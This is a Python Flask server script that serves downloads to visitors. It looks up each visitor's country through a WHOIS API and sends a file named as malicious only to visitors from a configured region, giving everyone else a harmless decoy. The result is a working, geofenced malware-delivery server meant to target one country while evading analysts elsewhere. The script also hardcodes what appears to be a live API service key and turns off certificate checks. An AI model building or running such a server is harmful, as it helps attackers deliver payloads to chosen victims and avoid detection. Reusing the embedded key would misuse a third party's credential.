from flask import Flask, request, send_file
import requests
import os
import json

app = Flask(__name__)

MALICIOUS_FILE_PATH = os.environ.get("MALICIOUS_FILE_PATH", "./files/malicious_file.txt")
NONE_MALICIOUS_FILE_PATH = os.environ.get("NONE_MALICIOUS_FILE_PATH", "./files/none_malicious_file.txt")
REGION_OF_MALICIOUS_RETURN = os.environ.get("REGION_OF_MALICIOUS_RETURN", None)

@app.route('/')
def home():
    if REGION_OF_MALICIOUS_RETURN:
        try:
            remote_addr = request.remote_addr
            
            api_param = {
                "serviceKey": "WV8lzb2Hk0HQZV08PpT2CxFSCGm8Nz5cZURni1mvK+zd/72mRL9b68qKw7CmJxVCHM1QOrp1uR84YL8JuB4O+g==",
                "query": remote_addr,
                "answer": "json",
            }

            res = requests.get(url="http://apis.data.go.kr/B551505/whois/ipas_country_code", params=api_param, verify=False).json()

            response = res.get("response", {})
            whois = response.get("whois", {})
            country_code = whois.get("countryCode", None)
        
            print(f'[*] remote_addr: {remote_addr}, country: {country_code}')

            if not country_code or country_code == "none" or country_code != REGION_OF_MALICIOUS_RETURN:
                path = NONE_MALICIOUS_FILE_PATH

            else:
                path = MALICIOUS_FILE_PATH

        except json.JSONDecodeError:
            path = NONE_MALICIOUS_FILE_PATH
            print("Invalid JSON format.")
        
        except KeyError:
            path = NONE_MALICIOUS_FILE_PATH
            print("Key not found.")

    else:
        path = MALICIOUS_FILE_PATH
    
    return send_file(path, as_attachment=True)

if __name__ == '__main__':

    print(f"[*] Malicious file path --> {MALICIOUS_FILE_PATH}")
    print(f"[*] None malicious file path --> {NONE_MALICIOUS_FILE_PATH}")
    print(f"[*] Region of maliious return --> {REGION_OF_MALICIOUS_RETURN}")
    
    app.run(host='0.0.0.0', port=80)